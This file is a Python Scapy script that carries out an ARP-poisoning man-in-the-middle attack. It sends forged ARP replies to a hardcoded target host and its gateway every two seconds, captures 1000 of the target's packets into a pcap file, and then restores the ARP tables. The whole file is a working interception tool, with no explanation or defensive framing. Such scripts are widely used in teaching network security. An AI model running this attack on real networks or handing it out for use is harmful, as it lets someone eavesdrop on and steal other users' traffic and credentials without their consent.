from scapy.all import *
import os
import sys
import threading
import signal

gverbose = True

interface = 'eth0'
target_ip = '10.1.22.108'
gateway_ip = '10.1.22.1'
packet_count = 1000
conf.iface = interface
conf.verb = 0


def vprint(verbose_string, lverbose=False):
    '''
        Enables verbose printing with a custom line icon in brackets.
    '''
    global gverbose
    if lverbose or gverbose:
        if gverbose is True:
            icon = '*'
        else:
            icon = '[{}]'.format(lverbose)
        print('{} {}'.format(icon, verbose_string))


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    vprint('Restoring target')
    send(ARP(
        op=2,
        psrc=gateway_ip,
        pdst=target_ip,
        hwdst='ff:ff:ff:ff:ff:ff',
        hwsrc=gateway_mac), count=5)
    send(ARP(
        op=2,
        psrc=target_ip,
        pdst=gateway_ip,
        hwdst='ff:ff:ff:ff:ff:ff',
        hwsrc=target_mac), count=5)
    vprint('Target restoration ended')


def get_mac(ip_address):
    responses, unanswered = srp(Ether(
        dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip_address),
        timeout=2,
        retry=10)
    for s, r in responses:
        return r[Ether].src
    return None


def poison_target(
        gateway_ip,
        gateway_mac,
        target_ip,
        target_mac,
        stop_event=False):
    poison_target = ARP(
        op=2,
        psrc=gateway_ip,
        pdst=target_ip,
        hwdst=target_mac)

    poison_gateway = ARP(
        op=2,
        psrc=target_ip,
        pdst=gateway_ip,
        hwdst=gateway_mac)

    vprint('Beginning ARP poison. [CTR-C] to stop]')

    while not stop_event.wait(2):
        try:
            send(poison_target)
            send(poison_gateway)
        except KeyboardInterrupt:
            vprint('Stop attack requested.')
            exit(0)
        except Exception as ep:
            vprint('Problem while poisoning target. {}'.format(ep))
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
            vprint('ARP poison attack stopped.')
            raise
    vprint('Stop event received.')


vprint('Setting up {}'.format(interface))
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    vprint('Failed to get gateway MAC. Exiting.', '!!')
    sys.exit(0)
else:
    vprint('Gateway {} is at {}'.format(gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print('Failed to get target MAC. Exiting', '!!')
    sys.exit(0)
else:
    print('Target {} is at {}'.format(target_ip, target_mac))

stopper = threading.Event()
poison_thread = threading.Thread(
    target=poison_target,
    args=(gateway_ip, gateway_mac, target_ip, target_mac, stopper))
poison_thread.start()

try:
    vprint('Starting sniffer for {} packets'.format(packet_count))

    bpf_filter = 'ip host {}'.format(target_ip)
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
    vprint('Stopped sniffing')
    wrpcap('arper.pcap', packets)
    vprint('pcap written')
except Exception as e1:
    vprint('Problem while listening for packets. {}'.format(e1))
    raise
finally:
    stopper.set()
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    exit(0)
